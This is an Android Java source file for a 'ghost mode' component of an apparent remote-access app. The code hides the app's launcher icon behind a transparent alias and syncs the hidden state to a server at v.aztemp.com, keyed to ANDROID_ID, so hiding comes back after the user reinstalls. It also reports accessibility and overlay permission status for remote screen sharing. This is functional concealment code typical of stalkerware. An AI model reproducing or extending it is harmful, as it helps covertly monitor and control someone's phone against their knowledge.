package com.tokendeal.vremote;

import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;

/**
 * Keeps ghost-mode state in sync with the server (devices.json on v.aztemp.com)
 * so the hidden state SURVIVES app reinstall. deviceId is derived from ANDROID_ID,
 * which is stable across reinstalls, so the server can re-apply ghost=true after
 * a fresh install wiped local SharedPreferences.
 */
public class GhostStateSync {
    private static final String TAG = "GhostStateSync";
    public static final String PREF_NAME = "VRemotePrefs";
    public static final String KEY_GHOST = "ghost_mode";
    private static final String API = "https://v.aztemp.com/api/ghost-state";

    /** Apply launcher aliases to reflect ghost on/off. Mirrors MainActivity.applyGhostMode. */
    public static void applyAliases(Context ctx, boolean enable) {
        try {
            android.content.pm.PackageManager pm = ctx.getPackageManager();
            String pkg = ctx.getPackageName();
            android.content.ComponentName normalAlias = new android.content.ComponentName(pkg, pkg + ".MainAliasNormal");
            android.content.ComponentName ghostAlias  = new android.content.ComponentName(pkg, pkg + ".MainAliasGhost");
            if (enable) {
                // Ghost ON: normal icon+title hidden, TRANSPARENT alias stays ENABLED so any
                // tap always launches the app — Android can NEVER fall back to App info page.
                pm.setComponentEnabledSetting(normalAlias,
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(ghostAlias,
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP);
            } else {
                pm.setComponentEnabledSetting(ghostAlias,
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP);
                pm.setComponentEnabledSetting(normalAlias,
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP);
            }
            // Verify: read back the REAL state and report it to the server logs for diagnosis.
            // COMPONENT_ENABLED_STATE_ENABLED=1, DISABLED=2, DEFAULT=0
            try {
                int nState = pm.getComponentEnabledSetting(normalAlias);
                int gState = pm.getComponentEnabledSetting(ghostAlias);
                String msg = "GhostVerify wantGhost=" + enable + " normalState=" + nState + " ghostAliasState=" + gState;
                Log.i(TAG, msg);
                AppLogs.i(TAG, msg);
            } catch (Exception ignored) {}
            Log.d(TAG, "Aliases applied ghost=" + enable);
        } catch (Exception e) {
            Log.e(TAG, "applyAliases error: " + e.getMessage());
        }
    }

    /** Adds appVersion + local ghost state to a register-device payload (for server-side diagnosis). */
    public static void putGhostFields(org.json.JSONObject payload, Context ctx) {
        try {
            if (payload == null || ctx == null) return;
            String ver = "";
            try {
                android.content.pm.PackageInfo pi = ctx.getPackageManager()
                        .getPackageInfo(ctx.getPackageName(), 0);
                ver = pi.versionName != null ? pi.versionName : "";
            } catch (Exception ignored) {}
            boolean ghost = false;
            try {
                ghost = ctx.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE).getBoolean(KEY_GHOST, false);
            } catch (Exception ignored) {}
            payload.put("appVersion", ver);
            payload.put("ghost", ghost);
            // Live permission snapshot so the website Devices panel can tell the
            // truth (e.g. screen share is impossible while Accessibility is off).
            try {
                org.json.JSONObject perms = new org.json.JSONObject();
                boolean acc = false;
                try { acc = RemoteAccessibilityService.isAccessibilityServiceEnabled(ctx); } catch (Throwable ignored) {}
                perms.put("accessibility", acc);
                boolean overlay = false;
                try { overlay = android.provider.Settings.canDrawOverlays(ctx); } catch (Throwable ignored) {}
                perms.put("overlay", overlay);
                boolean battery = false;
                try {
                    android.os.PowerManager pm = (android.os.PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
                    battery = pm != null && pm.isIgnoringBatteryOptimizations(ctx.getPackageName());
                } catch (Throwable ignored) {}
                perms.put("battery", battery);
                payload.put("permissions", perms);
            } catch (Throwable ignored) {}
        } catch (Exception ignored) {}
    }

    /** Save ghost state locally AND push to server. Call after every toggle. */
    public static void save(Context ctx, boolean ghost) {
        try {
            SharedPreferences prefs = ctx.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
            prefs.edit().putBoolean(KEY_GHOST, ghost).apply();
        } catch (Exception ignored) {}
        applyAliases(ctx, ghost);
        push(ctx, ghost);
    }

    /** Push ghost state to server in background. */
    public static void push(final Context ctx, final boolean ghost) {
        new Thread(() -> {
            try {
                String deviceId = DeviceRegistry.getDeviceId(ctx);
                String body = "deviceId=" + URLEncoder.encode(deviceId, "UTF-8") + "&ghost=" + ghost;
                HttpURLConnection conn = (HttpURLConnection) new URL(API).openConnection();
                conn.setRequestMethod("POST");
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(8000);
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                try (OutputStream os = conn.getOutputStream()) {
                    os.write(body.getBytes(StandardCharsets.UTF_8));
                }
                int code = conn.getResponseCode();
                Log.i(TAG, "Ghost push deviceId=" + deviceId + " ghost=" + ghost + " http=" + code);
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Ghost push failed: " + e.getMessage());
            }
        }).start();
    }

    /**
     * If local pref is missing (fresh install), fetch ghost state from server and apply.
     * Safe to call on every start; no-op when local pref already exists.
     */
    public static void pullAndApply(final Context ctx) {
        new Thread(() -> {
            try {
                SharedPreferences prefs = ctx.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
                if (prefs.contains(KEY_GHOST)) return;
                String deviceId = DeviceRegistry.getDeviceId(ctx);
                HttpURLConnection conn = (HttpURLConnection) new URL(
                        API + "?deviceId=" + URLEncoder.encode(deviceId, "UTF-8")).openConnection();
                conn.setConnectTimeout(8000);
                conn.setReadTimeout(8000);
                StringBuilder sb = new StringBuilder();
                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), StandardCharsets.UTF_8))) {
                    String line;
                    while ((line = br.readLine()) != null) sb.append(line);
                }
                conn.disconnect();
                String resp = sb.toString();
                boolean ghost = resp.contains("\"ghost\":true") || resp.contains("\"ghost\": true");
                prefs.edit().putBoolean(KEY_GHOST, ghost).apply();
                applyAliases(ctx, ghost);
                Log.i(TAG, "Ghost pulled from server deviceId=" + deviceId + " ghost=" + ghost);
            } catch (Exception e) {
                Log.e(TAG, "Ghost pull failed: " + e.getMessage());
            }
        }).start();
    }
}
